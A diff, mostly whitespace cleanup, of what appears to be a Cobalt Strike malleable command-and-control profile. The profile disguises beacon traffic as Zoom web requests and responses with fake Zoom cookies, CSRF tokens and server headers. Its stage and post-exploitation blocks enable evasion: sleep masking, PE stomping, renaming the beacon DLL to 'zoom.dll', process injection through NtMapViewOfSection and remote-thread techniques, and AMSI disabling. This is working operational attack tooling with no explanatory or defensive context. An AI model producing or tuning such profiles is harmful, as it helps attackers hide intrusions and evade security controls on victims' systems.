@@ -87,7 +87,6 @@ http-get {
     set uri "/s/58462514417 /wc/58462514417";
     
     client {
-
         #header "Host" "";
         header "Connection" "close";
         header "Sec-Fetch-Site" "same-origin";
@@ -95,10 +94,8 @@ http-get {
         header "Sec-Fetch-User" "?1";
         header "Sec-Detch-Dest" "document";
 
-       
         metadata {
             base64;
-
             prepend "zm_gnl_guid=";
             header "Cookie";
 
@@ -106,7 +103,6 @@ http-get {
     }
 
     server {
-    
         header "Content-Type" "text/html;charset=utf-8";
         header "Connection" "close";
         header "Server" "ZOOM";
@@ -114,9 +110,7 @@ http-get {
         header "X-Content-Type-Options" "nosniff";
  
         output {
-
             base64;
-            
             prepend "<!DOCTYPE html>
 <html xmlns:fb=\"http://ogp.me/ns/fb#\">
 <head prefix=\"og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# zoomvideocall: http://ogp.me/ns/fb/zoomvideocall#\">
@@ -177,29 +171,26 @@ http-post {
     set verb "POST";
 
     client {
-
     #header "Host" "";
     header "Connection" "close";
-    #header "Accept" "*/*";
+    header "Accept" "*/*";
     header "Sec-Fetch-Site" "same-origin";
-        header "Sec-Fetch-Mode" "navigate";
-        header "Sec-Detch-Dest" "document";
+    header "Sec-Fetch-Mode" "navigate";
+    header "Sec-Detch-Dest" "document";
         
         output {
             base64url;
             prepend "zm_gnl_guid=";
-        header "Cookie";
+            header "Cookie";
         }
 
         id {
-        base64url;
+            base64url;
             header "ZOOM-CSRFTOKEN";
-
         }
     }
 
     server {
-    
         header "Content-Type" "text/html;charset=utf-8";
         header "Connection" "close";
         header "Server" "ZOOM";
@@ -208,15 +199,12 @@ http-post {
 
         output {
             netbios;        
-       
-        prepend "    \"result\":\n";
-        prepend "    \"errorMessage\":null,\n";
-        prepend "    \"errorCode\":0,\n";
-        prepend "    \"status\":true,\n";
-        prepend "{\n";
-
-        append "}\n";
-
+            prepend "    \"result\":\n";
+            prepend "    \"errorMessage\":null,\n";
+            prepend "    \"errorCode\":0,\n";
+            prepend "    \"status\":true,\n";
+            prepend "{\n";
+            append "}\n";
             print;
         }
     }
@@ -230,7 +218,6 @@ http-stager {
     set uri_x64 "/signin";
 
     client {
-        
         #header "Host" "";
         header "Connection" "close";
         header "Sec-Fetch-Site" "same-origin";
@@ -240,21 +227,17 @@ http-stager {
     }
 
     server {
-        
         header "Content-Type" "text/html;charset=utf-8";
         header "Connection" "close";
         header "Server" "ZOOM";
         header "X-Robots-Tag" "noindex, nofollow";
         header "X-Content-Type-Options" "nosniff";
     
-    output {
-    
-        prepend "content=";
-        
-        append "</script>\n";
-        print;
-    }
-
+        output {
+            prepend "content=";
+            append "</script>\n";
+            print;
+        }
     }
 }
 
@@ -267,14 +250,13 @@ stage {
     #set image_size_x86 "6586368";
     #set image_size_x64 "6586368";
     #set name           "WWanMM.dll";
+
     set userwx          "false";
     set cleanup         "true";
     set sleep_mask  "true";
     set stomppe         "true";
     set obfuscate   "true";
     set rich_header     "";
-    
-    set sleep_mask "true";
     
     set smartinject "true";
     
@@ -289,13 +271,13 @@ stage {
     transform-x86 {
         prepend "\x90\x90\x90";
         strrep "ReflectiveLoader" "LoadMem";
-        strrep "beacon.dll" "msagent.dll";
+        strrep "beacon.dll" "zoom.dll";
         }
 
     transform-x64 {
         prepend "\x90\x90\x90";
         strrep "ReflectiveLoader" "LoadMem";
-        strrep "beacon.x64.dll" "msagent.dll";
+        strrep "beacon.x64.dll" "zoom.dll";
         }
 
     #string "something";
@@ -306,14 +288,10 @@ stage {
 
 ###Process Inject Block###
 process-inject {
-
     set allocator "NtMapViewOfSection";     
-
     set min_alloc "16700";
-
     set userwx "false";  
-    
-    set startrwx "true";
+    set startrwx "false";
         
     transform-x86 {
         prepend "\x90\x90\x90";
@@ -325,17 +303,12 @@ process-inject {
     execute {
         #CreateThread;
         #CreateRemoteThread;       
-
         CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
-
         SetThreadContext;
 
         NtQueueApcThread-s;
-
         #NtQueueApcThread;
-
         CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
-
         RtlCreateUserThread;
     }
 }
@@ -347,9 +320,7 @@ post-ex {
     set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
 
     set obfuscate "true";
-
     set smartinject "true";
-
     set amsi_disable "true";
     
     set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
